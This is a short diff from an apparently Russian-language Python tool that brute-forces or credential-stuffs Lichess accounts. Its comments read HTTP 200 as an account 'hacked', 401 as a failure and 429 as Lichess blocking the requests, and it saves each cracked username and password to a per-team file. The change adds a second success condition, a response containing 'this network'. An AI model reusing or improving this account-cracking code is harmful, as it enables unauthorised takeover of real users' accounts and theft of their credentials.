@@ -79,7 +79,7 @@ def start(passwords):
 
             #       Выводим статус взлома
             #       200 означает что аккаунт взломан, 401 что взломать не получилось, 429 что личесс блокирует ваши запросы
-            if str(r) == f"<Response [{str(OK_RESPONSE)}]>":
+            if str(r) == f"<Response [{str(OK_RESPONSE)}]>" or r.text.find("this network") > -1:
                 log.info(f"Пароль получен! ({r}) {username}: {password}")
                 with open(f"{HACKEDREAL_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем акк
                     h_list.write(f"{get_ts()} {r} {username}: {password} \n")
